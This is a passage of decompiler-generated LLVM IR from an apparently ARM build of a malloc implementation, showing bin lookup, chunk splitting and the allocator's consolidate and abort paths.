  %v3_125c0 = and i1 %v2_125bc, %v2_125c0
  br i1 %v3_125c0, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_125b0
  %v5_125c0 = and i32 %v1_125b0, -8
  store i32 %v5_125c0, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_125b0, %bb
  %v4_125c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_125c4, i32* @r0, align 4
  %v1_125c8 = inttoptr i32 %v4_125c4 to i32*
  %v2_125c8 = load i32, i32* %v1_125c8, align 4
  store i32 %v2_125c8, i32* @r4, align 4
  %v2_125cc = xor i1 %v2_125bc, true
  %v3_125cc = or i1 %v7_125bc, %v2_125cc
  br i1 %v3_125cc, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_125d0 = urem i32 %v2_125c8, 2
  %v2_125d0 = icmp eq i32 %v1_125d0, 0
  br i1 %v2_125d0, label %dec_label_pc_125d8, label %dec_label_pc_125e8

dec_label_pc_125d8:                               ; preds = %bb143
  %v2_125d8 = icmp eq i32 %v2_125c8, 0
  br i1 %v2_125d8, label %dec_label_pc_125e0, label %dec_label_pc_129c4

dec_label_pc_125e0:                               ; preds = %dec_label_pc_125d8
  %v0_125e0 = call i32 @__malloc_consolidate()
  store i32 %v0_125e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_129c4

dec_label_pc_125e8:                               ; preds = %bb143
  %v0_125e8 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_125e8, %v2_125c8
  br i1 %tmp204, label %dec_label_pc_12610, label %dec_label_pc_125f0

dec_label_pc_125f0:                               ; preds = %dec_label_pc_125e8
  %v1_125f0 = add i32 %v4_125c4, -4
  store i32 %v1_125f0, i32* %r1.global-to-local, align 4
  %v3_125f4 = udiv i32 %v0_125e8, 8
  store i32 %v3_125f4, i32* %r2.global-to-local, align 4
  %v4_125f8 = mul nuw i32 %v3_125f4, 4
  %v5_125f8 = add i32 %v4_125f8, %v1_125f0
  %v6_125f8 = inttoptr i32 %v5_125f8 to i32*
  %v7_125f8 = load i32, i32* %v6_125f8, align 4
  store i32 %v7_125f8, i32* %r0.global-to-local, align 4
  %v2_125fc = icmp eq i32 %v7_125f8, 0
  br i1 %v2_125fc, label %dec_label_pc_12610, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_125f0
  %v2_12600 = add i32 %v7_125f8, 8
  %v3_12600 = inttoptr i32 %v2_12600 to i32*
  %v4_12600 = load i32, i32* %v3_12600, align 4
  store i32 %v4_12600, i32* %r3.global-to-local, align 4
  store i32 %v2_12600, i32* %r0.global-to-local, align 4
  store i32 %v2_12600, i32* %r4.global-to-local, align 4
  store i32 %v4_12600, i32* %v6_125f8, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12610:                               ; preds = %dec_label_pc_125f0, %dec_label_pc_125e8
  %tmp205 = icmp ugt i32 %v0_125e8, 255
  br i1 %tmp205, label %dec_label_pc_12660, label %dec_label_pc_12618

dec_label_pc_12618:                               ; preds = %dec_label_pc_12610
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12620 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  %v3_12624 = udiv i32 %v0_125e8, 8
  store i32 %v3_12624, i32* @r7, align 4
  %v4_12628 = mul nuw i32 %v3_12624, 8
  %v5_12628 = add i32 %v4_12620, %v4_12628
  store i32 %v5_12628, i32* %r3.global-to-local, align 4
  %v1_1262c = add i32 %v5_12628, 44
  store i32 %v1_1262c, i32* %ip.global-to-local, align 4
  %v1_12630 = add i32 %v5_12628, 56
  %v2_12630 = inttoptr i32 %v1_12630 to i32*
  %v3_12630 = load i32, i32* %v2_12630, align 4
  store i32 %v3_12630, i32* %r0.global-to-local, align 4
  %v9_12634 = icmp eq i32 %v3_12630, %v1_1262c
  br i1 %v9_12634, label %dec_label_pc_127c0, label %dec_label_pc_1263c

dec_label_pc_1263c:                               ; preds = %dec_label_pc_12618
  %v2_1263c = add i32 %v3_12630, %v0_125e8
  store i32 %v2_1263c, i32* %r3.global-to-local, align 4
  %v1_12640 = add i32 %v2_1263c, 4
  %v2_12640 = inttoptr i32 %v1_12640 to i32*
  %v3_12640 = load i32, i32* %v2_12640, align 4
  store i32 %v3_12640, i32* %r2.global-to-local, align 4
  %v1_12644 = add i32 %v3_12630, 12
  %v2_12644 = inttoptr i32 %v1_12644 to i32*
  %v3_12644 = load i32, i32* %v2_12644, align 4
  store i32 %v3_12644, i32* %r1.global-to-local, align 4
  %v1_12648 = or i32 %v3_12640, 1
  store i32 %v1_12648, i32* %r2.global-to-local, align 4
  %v1_1264c = add i32 %v3_12630, 8
  store i32 %v1_1264c, i32* %r4.global-to-local, align 4
  store i32 %v1_12648, i32* %v2_12640, align 4
  %v0_12654 = load i32, i32* %ip.global-to-local, align 4
  %v1_12654 = load i32, i32* %r1.global-to-local, align 4
  %v2_12654 = add i32 %v1_12654, 8
  %v3_12654 = inttoptr i32 %v2_12654 to i32*
  store i32 %v0_12654, i32* %v3_12654, align 4
  %v0_12658 = load i32, i32* %r1.global-to-local, align 4
  %v1_12658 = load i32, i32* %ip.global-to-local, align 4
  %v2_12658 = add i32 %v1_12658, 12
  %v3_12658 = inttoptr i32 %v2_12658 to i32*
  store i32 %v0_12658, i32* %v3_12658, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12660:                               ; preds = %dec_label_pc_12610
  store i32 %v0_125e8, i32* %r0.global-to-local, align 4
  %v1_12664 = call i32 @__malloc_largebin_index(i32 %v0_125e8)
  store i32 %v1_12664, i32* %r0.global-to-local, align 4
  %v0_12668 = load i32, i32* @r4, align 4
  %v1_12668 = and i32 %v0_12668, 2
  %v2_12668 = icmp eq i32 %v1_12668, 0
  store i32 %v1_12664, i32* @r7, align 4
  br i1 %v2_12668, label %dec_label_pc_127c0, label %dec_label_pc_12674

dec_label_pc_12674:                               ; preds = %dec_label_pc_12660
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r1.global-to-local, align 4
  %v4_1267c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_1267c, i32* @r0, align 4
  %v0_12680 = call i32 @__malloc_consolidate()
  store i32 %v0_12680, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_127c0

dec_label_pc_12688:                               ; preds = %dec_label_pc_127d4
  %v1_12688 = add i32 %v3_127d4, 4
  %v2_12688 = inttoptr i32 %v1_12688 to i32*
  %v3_12688 = load i32, i32* %v2_12688, align 4
  store i32 %v3_12688, i32* %r3.global-to-local, align 4
  %v0_1268c = load i32, i32* @sl, align 4
  %v1_12690 = and i32 %v3_12688, -4
  store i32 %v1_12690, i32* %r4.global-to-local, align 4
  %v1_12694 = add i32 %v3_127d4, 12
  %v2_12694 = inttoptr i32 %v1_12694 to i32*
  %v3_12694 = load i32, i32* %v2_12694, align 4
  store i32 %v3_12694, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_1268c, 255
  br i1 %tmp206, label %dec_label_pc_126f0, label %dec_label_pc_1269c

dec_label_pc_1269c:                               ; preds = %dec_label_pc_12688
  %v9_1269c = icmp eq i32 %v3_12694, %v0_126f4
  br i1 %v9_1269c, label %dec_label_pc_126a4, label %dec_label_pc_126f0

dec_label_pc_126a4:                               ; preds = %dec_label_pc_1269c
  %v0_126a4 = load i32, i32* @sb, align 4
  %v1_126a4 = add i32 %v0_126a4, 48
  %v2_126a4 = inttoptr i32 %v1_126a4 to i32*
  %v3_126a4 = load i32, i32* %v2_126a4, align 4
  store i32 %v3_126a4, i32* %r3.global-to-local, align 4
  %v9_126a8 = icmp eq i32 %v3_127d4, %v3_126a4
  br i1 %v9_126a8, label %dec_label_pc_126b0, label %dec_label_pc_126f0

dec_label_pc_126b0:                               ; preds = %dec_label_pc_126a4
  %v1_126b0 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_12690, %v1_126b0
  br i1 %tmp207, label %dec_label_pc_126b8, label %dec_label_pc_126f0

dec_label_pc_126b8:                               ; preds = %dec_label_pc_126b0
  %v2_126b8 = sub i32 %v1_12690, %v0_1268c
  store i32 %v2_126b8, i32* %r2.global-to-local, align 4
  %v2_126bc = add i32 %v0_1268c, %v3_127d4
  store i32 %v2_126bc, i32* %r3.global-to-local, align 4
  %v1_126c0 = or i32 %v0_1268c, 1
  store i32 %v1_126c0, i32* %r0.global-to-local, align 4
  %v1_126c4 = or i32 %v2_126b8, 1
  store i32 %v1_126c4, i32* %r1.global-to-local, align 4
  %v1_126c8 = add i32 %v3_127d4, 8
  store i32 %v1_126c8, i32* %r4.global-to-local, align 4
  %v2_126cc = add i32 %v0_126f4, 8
  %v3_126cc = inttoptr i32 %v2_126cc to i32*
  store i32 %v2_126bc, i32* %v3_126cc, align 4
  %v0_126d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_126d0 = load i32, i32* %ip.global-to-local, align 4
  %v2_126d0 = add i32 %v1_126d0, 12
  %v3_126d0 = inttoptr i32 %v2_126d0 to i32*
  store i32 %v0_126d0, i32* %v3_126d0, align 4
  %v0_126d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_126d4 = load i32, i32* @r6, align 4
  %v2_126d4 = add i32 %v1_126d4, 4
  %v3_126d4 = inttoptr i32 %v2_126d4 to i32*
  store i32 %v0_126d4, i32* %v3_126d4, align 4
  %v0_126d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_126d8 = load i32, i32* @sb, align 4
  %v2_126d8 = add i32 %v1_126d8, 48
  %v3_126d8 = inttoptr i32 %v2_126d8 to i32*
  store i32 %v0_126d8, i32* %v3_126d8, align 4
  %v0_126dc = load i32, i32* %r2.global-to-local, align 4
  %v1_126dc = load i32, i32* %r3.global-to-local, align 4
  %v3_126dc = add i32 %v1_126dc, %v0_126dc
  %v4_126dc = inttoptr i32 %v3_126dc to i32*
  store i32 %v0_126dc, i32* %v4_126dc, align 4
  %v0_126e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_126e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_126e0 = add i32 %v1_126e0, 4
  %v3_126e0 = inttoptr i32 %v2_126e0 to i32*
  store i32 %v0_126e0, i32* %v3_126e0, align 4
  %v0_126e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_126e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_126e4 = add i32 %v1_126e4, 12
  %v3_126e4 = inttoptr i32 %v2_126e4 to i32*
  store i32 %v0_126e4, i32* %v3_126e4, align 4
  %v0_126e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_126e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_126e8 = add i32 %v1_126e8, 8
  %v3_126e8 = inttoptr i32 %v2_126e8 to i32*
  store i32 %v0_126e8, i32* %v3_126e8, align 4
  br label %dec_label_pc_12e18

dec_label_pc_126f0:                               ; preds = %dec_label_pc_126b0, %dec_label_pc_126a4, %dec_label_pc_1269c, %dec_label_pc_12688
  %v9_126f0 = icmp eq i32 %v1_12690, %v0_1268c
  %v2_126f4 = add i32 %v3_12694, 8
  %v3_126f4 = inttoptr i32 %v2_126f4 to i32*
  store i32 %v0_126f4, i32* %v3_126f4, align 4
  %v0_126f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_126f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_126f8 = add i32 %v1_126f8, 12
  %v3_126f8 = inttoptr i32 %v2_126f8 to i32*
  store i32 %v0_126f8, i32* %v3_126f8, align 4
  br i1 %v9_126f0, label %dec_label_pc_12850.loopexit, label %dec_label_pc_1270c

dec_label_pc_1270c:                               ; preds = %dec_label_pc_126f0
  %v0_1270c = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_1270c, 255
  br i1 %tmp208, label %dec_label_pc_12730, label %dec_label_pc_12714

dec_label_pc_12714:                               ; preds = %dec_label_pc_1270c
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r2.global-to-local, align 4
  %v1_12718 = load i32, i32* %r8.global-to-local, align 4
  %v2_12718 = add i32 %v1_12718, ptrtoint (i32* @global_var_22244.363 to i32)
  %v3_12718 = inttoptr i32 %v2_12718 to i32*
  %v4_12718 = load i32, i32* %v3_12718, align 4
  %v3_1271c = udiv i32 %v0_1270c, 8
  store i32 %v3_1271c, i32* %r0.global-to-local, align 4
  %v4_12720 = mul nuw i32 %v3_1271c, 8
  %v5_12720 = add i32 %v4_12718, %v4_12720
  store i32 %v5_12720, i32* %r3.global-to-local, align 4
  %v1_12724 = add i32 %v5_12720, 44
  store i32 %v1_12724, i32* %ip.global-to-local, align 4
  %v1_12728 = add i32 %v5_12720, 52
  %v2_12728 = inttoptr i32 %v1_12728 to i32*
  %v3_12728 = load i32, i32* %v2_12728, align 4
  store i32 %v3_12728, i32* @lr, align 4
  br label %dec_label_pc_12788

dec_label_pc_12730:                               ; preds = %dec_label_pc_1270c
  store i32 %v0_1270c, i32* %r0.global-to-local, align 4
  %v1_12734 = call i32 @__malloc_largebin_index(i32 %v0_1270c)
  store i32 %v1_12734, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %ip.global-to-local, align 4
  %v1_1273c = load i32, i32* %r8.global-to-local, align 4
  %v2_1273c = add i32 %v1_1273c, ptrtoint (i32* @global_var_22244.363 to i32)
  %v3_1273c = inttoptr i32 %v2_1273c to i32*
  %v4_1273c = load i32, i32* %v3_1273c, align 4
  %v4_12740 = mul i32 %v1_12734, 8
  %v5_12740 = add i32 %v4_1273c, %v4_12740
  store i32 %v5_12740, i32* %r3.global-to-local, align 4
  %v1_12744 = add i32 %v5_12740, 44
  store i32 %v1_12744, i32* %ip.global-to-local, align 4
  %v1_12748 = add i32 %v5_12740, 52
  %v2_12748 = inttoptr i32 %v1_12748 to i32*
  %v3_12748 = load i32, i32* %v2_12748, align 4
  store i32 %v3_12748, i32* @lr, align 4
  %v9_1274c = icmp eq i32 %v3_12748, %v1_12744
  br i1 %v9_1274c, label %dec_label_pc_12788, label %dec_label_pc_12754

dec_label_pc_12754:                               ; preds = %dec_label_pc_12730
  %v1_12754 = add i32 %v5_12740, 56
  %v2_12754 = inttoptr i32 %v1_12754 to i32*
  %v3_12754 = load i32, i32* %v2_12754, align 4
  store i32 %v3_12754, i32* %r1.global-to-local, align 4
  %v1_12758 = add i32 %v3_12754, 4
  %v2_12758 = inttoptr i32 %v1_12758 to i32*
  %v3_12758 = load i32, i32* %v2_12758, align 4
  store i32 %v3_12758, i32* %r3.global-to-local, align 4
  %v0_1275c = load i32, i32* %r4.global-to-local, align 4
  %v3_1275c = icmp ult i32 %v0_1275c, %v3_12758
  br i1 %v3_1275c, label %.thread, label %dec_label_pc_12778.preheader

.thread:                                          ; preds = %dec_label_pc_12754
  store i32 %v1_12744, i32* @lr, align 4
  store i32 %v3_12754, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12788

dec_label_pc_12778.preheader:                     ; preds = %dec_label_pc_12754
  %v2_12764 = or i32 %v0_1275c, 1
  store i32 %v2_12764, i32* %r2.global-to-local, align 4
  %v1_12778182 = add i32 %v3_12748, 4
  %v2_12778183 = inttoptr i32 %v1_12778182 to i32*
  %v3_12778184 = load i32, i32* %v2_12778183, align 4
  store i32 %v3_12778184, i32* %r3.global-to-local, align 4
  %v3_1277c186 = icmp ult i32 %v2_12764, %v3_12778184
  br i1 %v3_1277c186, label %dec_label_pc_12774, label %dec_label_pc_12784

dec_label_pc_12774:                               ; preds = %dec_label_pc_12778.preheader, %dec_label_pc_12774
  %v0_12784187 = phi i32 [ %v3_12774, %dec_label_pc_12774 ], [ %v3_12748, %dec_label_pc_12778.preheader ]
  %v1_12774 = add i32 %v0_12784187, 8
  %v2_12774 = inttoptr i32 %v1_12774 to i32*
  %v3_12774 = load i32, i32* %v2_12774, align 4
  store i32 %v3_12774, i32* @lr, align 4
  %v1_12778 = add i32 %v3_12774, 4
  %v2_12778 = inttoptr i32 %v1_12778 to i32*
  %v3_12778 = load i32, i32* %v2_12778, align 4
  store i32 %v3_12778, i32* %r3.global-to-local, align 4
  %v3_1277c = icmp ult i32 %v2_12764, %v3_12778
  br i1 %v3_1277c, label %dec_label_pc_12774, label %dec_label_pc_12784

dec_label_pc_12784:                               ; preds = %dec_label_pc_12774, %dec_label_pc_12778.preheader
  %v0_12784.lcssa = phi i32 [ %v3_12748, %dec_label_pc_12778.preheader ], [ %v3_12774, %dec_label_pc_12774 ]
  %v1_12784 = add i32 %v0_12784.lcssa, 12
  %v2_12784 = inttoptr i32 %v1_12784 to i32*
  %v3_12784 = load i32, i32* %v2_12784, align 4
  store i32 %v3_12784, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12788

dec_label_pc_12788:                               ; preds = %.thread, %dec_label_pc_12730, %dec_label_pc_12714, %dec_label_pc_12784
  %v0_127a8 = phi i32 [ %v1_12744, %dec_label_pc_12730 ], [ %v1_12724, %dec_label_pc_12714 ], [ %v3_12784, %dec_label_pc_12784 ], [ %v3_12754, %.thread ]
  %v0_1279c = phi i32 [ %v1_12734, %dec_label_pc_12730 ], [ %v3_1271c, %dec_label_pc_12714 ], [ %v1_12734, %dec_label_pc_12784 ], [ %v1_12734, %.thread ]
  %v1_1278c = phi i32 [ %v1_1273c, %dec_label_pc_12730 ], [ %v1_12718, %dec_label_pc_12714 ], [ %v1_1273c, %dec_label_pc_12784 ], [ %v1_1273c, %.thread ]
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r2.global-to-local, align 4
  %v2_1278c = add i32 %v1_1278c, ptrtoint (i32* @global_var_22244.363 to i32)
  %v3_1278c = inttoptr i32 %v2_1278c to i32*
  %v4_1278c = load i32, i32* %v3_1278c, align 4
  %v3_12790 = sdiv i32 %v0_1279c, 32
  store i32 %v3_12790, i32* %r3.global-to-local, align 4
  %v4_12794 = mul nsw i32 %v3_12790, 4
  %v5_12794 = add i32 %v4_1278c, %v4_12794
  store i32 %v5_12794, i32* %r1.global-to-local, align 4
  %v1_12798 = add i32 %v5_12794, 820
  %v2_12798 = inttoptr i32 %v1_12798 to i32*
  %v3_12798 = load i32, i32* %v2_12798, align 4
  %v1_1279c = urem i32 %v0_1279c, 32
  store i32 %v1_1279c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_127a4 = shl i32 1, %v1_1279c
  %v8_127a4 = or i32 %v3_12798, %v7_127a4
  store i32 %v8_127a4, i32* %r3.global-to-local, align 4
  %v1_127a8 = load i32, i32* @r6, align 4
  %v2_127a8 = add i32 %v1_127a8, 12
  %v3_127a8 = inttoptr i32 %v2_127a8 to i32*
  store i32 %v0_127a8, i32* %v3_127a8, align 4
  %v0_127ac = load i32, i32* @lr, align 4
  %v1_127ac = load i32, i32* @r6, align 4
  %v2_127ac = add i32 %v1_127ac, 8
  %v3_127ac = inttoptr i32 %v2_127ac to i32*
  store i32 %v0_127ac, i32* %v3_127ac, align 4
  %v0_127b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_127b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_127b0 = add i32 %v1_127b0, 820
  %v3_127b0 = inttoptr i32 %v2_127b0 to i32*
  store i32 %v0_127b0, i32* %v3_127b0, align 4
  %v0_127b4 = load i32, i32* @r6, align 4
  %v1_127b4 = load i32, i32* @lr, align 4
  %v2_127b4 = add i32 %v1_127b4, 12
  %v3_127b4 = inttoptr i32 %v2_127b4 to i32*
  store i32 %v0_127b4, i32* %v3_127b4, align 4
  %v0_127b8 = load i32, i32* @r6, align 4
  %v1_127b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_127b8 = add i32 %v1_127b8, 8
  %v3_127b8 = inttoptr i32 %v2_127b8 to i32*
  store i32 %v0_127b8, i32* %v3_127b8, align 4
  %v0_127d4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_127d4

dec_label_pc_127c0:                               ; preds = %dec_label_pc_12660, %dec_label_pc_12618, %dec_label_pc_12674
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r1.global-to-local, align 4
  %v4_127c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_127c8, i32* @sb, align 4
  %v0_127cc = load i32, i32* @sl, align 4
  %v1_127cc = add i32 %v0_127cc, 16
  store i32 %v1_127cc, i32* @fp, align 4
  %v1_127d0 = add i32 %v4_127c8, 52
  store i32 %v1_127d0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_127d4

dec_label_pc_127d4:                               ; preds = %dec_label_pc_12788, %dec_label_pc_127c0
  %v0_126f4 = phi i32 [ %v0_127d4.pre, %dec_label_pc_12788 ], [ %v1_127d0, %dec_label_pc_127c0 ]
  %v1_127d4 = add i32 %v0_126f4, 12
  %v2_127d4 = inttoptr i32 %v1_127d4 to i32*
  %v3_127d4 = load i32, i32* %v2_127d4, align 4
  store i32 %v3_127d4, i32* @r6, align 4
  %v9_127d8 = icmp eq i32 %v3_127d4, %v0_126f4
  br i1 %v9_127d8, label %dec_label_pc_127e0, label %dec_label_pc_12688

dec_label_pc_127e0:                               ; preds = %dec_label_pc_127d4
  %v0_127e0 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_127e0, 256
  %v0_12898.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_127e0.dec_label_pc_12898_crit_edge, label %dec_label_pc_127e8

dec_label_pc_127e0.dec_label_pc_12898_crit_edge:  ; preds = %dec_label_pc_127e0
  %.pre203 = mul i32 %v0_12898.pre, 8
  br label %dec_label_pc_12898

dec_label_pc_127e8:                               ; preds = %dec_label_pc_127e0
  %v4_127e8 = mul i32 %v0_12898.pre, 8
  %v5_127e8 = add i32 %v4_127e8, %v0_126f4
  store i32 %v5_127e8, i32* %r3.global-to-local, align 4
  %v1_127ec = add i32 %v5_127e8, -8
  store i32 %v1_127ec, i32* %r1.global-to-local, align 4
  %v1_127f0 = add i32 %v5_127e8, 4
  %v2_127f0 = inttoptr i32 %v1_127f0 to i32*
  %storemerge.pre = load i32, i32* %v2_127f0, align 4
  br label %dec_label_pc_12890

dec_label_pc_127f8:                               ; preds = %dec_label_pc_12890
  %v1_127f8 = add i32 %v1_12820, 4
  %v2_127f8 = inttoptr i32 %v1_127f8 to i32*
  %v3_127f8 = load i32, i32* %v2_127f8, align 4
  store i32 %v3_127f8, i32* %r3.global-to-local, align 4
  %v1_127fc = and i32 %v3_127f8, -4
  store i32 %v1_127fc, i32* %r2.global-to-local, align 4
  %v3_12800 = icmp ult i32 %v1_127fc, %v0_127e0
  %v1_12804 = add i32 %v1_12820, 12
  %v2_12804 = inttoptr i32 %v1_12804 to i32*
  %v3_12804 = load i32, i32* %v2_12804, align 4
  store i32 %v3_12804, i32* %r0.global-to-local, align 4
  br i1 %v3_12800, label %dec_label_pc_12890, label %dec_label_pc_1280c

dec_label_pc_1280c:                               ; preds = %dec_label_pc_127f8
  %v1_1280c = add i32 %v1_12820, 8
  %v2_1280c = inttoptr i32 %v1_1280c to i32*
  %v3_1280c = load i32, i32* %v2_1280c, align 4
  store i32 %v3_1280c, i32* %r1.global-to-local, align 4
  %v1_12810 = add i32 %v3_1280c, 12
  %v2_12810 = inttoptr i32 %v1_12810 to i32*
  %v3_12810 = load i32, i32* %v2_12810, align 4
  store i32 %v3_12810, i32* %r3.global-to-local, align 4
  %v9_12814 = icmp eq i32 %v3_12810, %v1_12820
  br i1 %v9_12814, label %dec_label_pc_1281c, label %dec_label_pc_12828

dec_label_pc_1281c:                               ; preds = %dec_label_pc_1280c
  %v1_1281c = add i32 %v3_12804, 8
  %v2_1281c = inttoptr i32 %v1_1281c to i32*
  %v3_1281c = load i32, i32* %v2_1281c, align 4
  store i32 %v3_1281c, i32* %r3.global-to-local, align 4
  %v9_12820 = icmp eq i32 %v3_1281c, %v1_12820
  br i1 %v9_12820, label %dec_label_pc_1282c, label %dec_label_pc_12828

dec_label_pc_12828:                               ; preds = %dec_label_pc_1280c, %dec_label_pc_1281c
  %v0_12828 = call i32 @abort()
  store i32 %v0_12828, i32* %r0.global-to-local, align 4
  %v0_1282c.pre = load i32, i32* @sl, align 4
  %v1_1282c.pre = load i32, i32* @r2, align 4
  %v0_12834.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1282c

dec_label_pc_1282c:                               ; preds = %dec_label_pc_1281c, %dec_label_pc_12828
  %v1_12834 = phi i32 [ %v3_12804, %dec_label_pc_1281c ], [ %v0_12828, %dec_label_pc_12828 ]
  %v0_12834 = phi i32 [ %v3_1280c, %dec_label_pc_1281c ], [ %v0_12834.pre, %dec_label_pc_12828 ]
  %v1_1282c = phi i32 [ %v1_127fc, %dec_label_pc_1281c ], [ %v1_1282c.pre, %dec_label_pc_12828 ]
  %v0_1282c = phi i32 [ %v0_127e0, %dec_label_pc_1281c ], [ %v0_1282c.pre, %dec_label_pc_12828 ]
  %v2_1282c = sub i32 %v1_1282c, %v0_1282c
  store i32 %v2_1282c, i32* %lr.global-to-local, align 4
  %v2_12834 = add i32 %v1_12834, 8
  %v3_12834 = inttoptr i32 %v2_12834 to i32*
  store i32 %v0_12834, i32* %v3_12834, align 4
  %v0_12838 = load i32, i32* %r0.global-to-local, align 4
  %v1_12838 = load i32, i32* %r1.global-to-local, align 4
  %v2_12838 = add i32 %v1_12838, 12
  %v3_12838 = inttoptr i32 %v2_12838 to i32*
  store i32 %v0_12838, i32* %v3_12838, align 4
  %v0_1283c = load i32, i32* %ip.global-to-local, align 4
  %v1_1283c = add i32 %v0_1283c, 8
  store i32 %v1_1283c, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_1282c, 15
  br i1 %tmp210, label %dec_label_pc_1285c, label %dec_label_pc_12844

dec_label_pc_12844:                               ; preds = %dec_label_pc_1282c
  %v1_12844 = load i32, i32* %r2.global-to-local, align 4
  %v2_12844 = add i32 %v1_12844, %v0_1283c
  store i32 %v2_12844, i32* %r2.global-to-local, align 4
  %v1_12848 = add i32 %v2_12844, 4
  %v2_12848 = inttoptr i32 %v1_12848 to i32*
  %v3_12848 = load i32, i32* %v2_12848, align 4
  store i32 %v3_12848, i32* %r3.global-to-local, align 4
  store i32 %v1_1283c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12850

dec_label_pc_12850.loopexit:                      ; preds = %dec_label_pc_126f0
  %v1_126fc = load i32, i32* @r6, align 4
  %v2_126fc = load i32, i32* @sl, align 4
  %v3_126fc = add i32 %v2_126fc, %v1_126fc
  store i32 %v3_126fc, i32* %r2.global-to-local, align 4
  %v2_12700 = add i32 %v3_126fc, 4
  %v3_12700 = inttoptr i32 %v2_12700 to i32*
  %v4_12700 = load i32, i32* %v3_12700, align 4
  store i32 %v4_12700, i32* %r3.global-to-local, align 4
  %v2_12704 = add i32 %v1_126fc, 8
  store i32 %v2_12704, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12850

dec_label_pc_12850:                               ; preds = %.dec_label_pc_12850_crit_edge, %dec_label_pc_12850.loopexit, %dec_label_pc_12844
  %v1_12854 = phi i32 [ %v4_12978, %.dec_label_pc_12850_crit_edge ], [ %v3_126fc, %dec_label_pc_12850.loopexit ], [ %v2_12844, %dec_label_pc_12844 ]
  %v0_12850 = phi i32 [ %v7_12978, %.dec_label_pc_12850_crit_edge ], [ %v4_12700, %dec_label_pc_12850.loopexit ], [ %v3_12848, %dec_label_pc_12844 ]
  %v1_12850 = or i32 %v0_12850, 1
  store i32 %v1_12850, i32* %r3.global-to-local, align 4
  %v2_12854 = add i32 %v1_12854, 4
  %v3_12854 = inttoptr i32 %v2_12854 to i32*
  store i32 %v1_12850, i32* %v3_12854, align 4
  br label %dec_label_pc_12e18

dec_label_pc_1285c:                               ; preds = %dec_label_pc_1282c
  %v1_1285c = load i32, i32* @sl, align 4
  %v2_1285c = add i32 %v1_1285c, %v0_1283c
  store i32 %v2_1285c, i32* %r2.global-to-local, align 4
  %v1_12860 = or i32 %v1_1285c, 1
  store i32 %v1_12860, i32* %r3.global-to-local, align 4
  %v0_12864 = load i32, i32* %lr.global-to-local, align 4
  %v1_12864 = or i32 %v0_12864, 1
  store i32 %v1_12864, i32* %r1.global-to-local, align 4
  store i32 %v1_1283c, i32* %r4.global-to-local, align 4
  %v2_1286c = add i32 %v0_1283c, 4
  %v3_1286c = inttoptr i32 %v2_1286c to i32*
  store i32 %v1_12860, i32* %v3_1286c, align 4
  %v0_12870 = load i32, i32* %r2.global-to-local, align 4
  %v1_12870 = load i32, i32* @r6, align 4
  %v2_12870 = add i32 %v1_12870, 8
  %v3_12870 = inttoptr i32 %v2_12870 to i32*
  store i32 %v0_12870, i32* %v3_12870, align 4
  %v0_12874 = load i32, i32* %r2.global-to-local, align 4
  %v1_12874 = load i32, i32* @r6, align 4
  %v2_12874 = add i32 %v1_12874, 12
  %v3_12874 = inttoptr i32 %v2_12874 to i32*
  store i32 %v0_12874, i32* %v3_12874, align 4
  %v0_12878 = load i32, i32* %lr.global-to-local, align 4
  %v1_12878 = load i32, i32* %r2.global-to-local, align 4
  %v3_12878 = add i32 %v1_12878, %v0_12878
  %v4_12878 = inttoptr i32 %v3_12878 to i32*
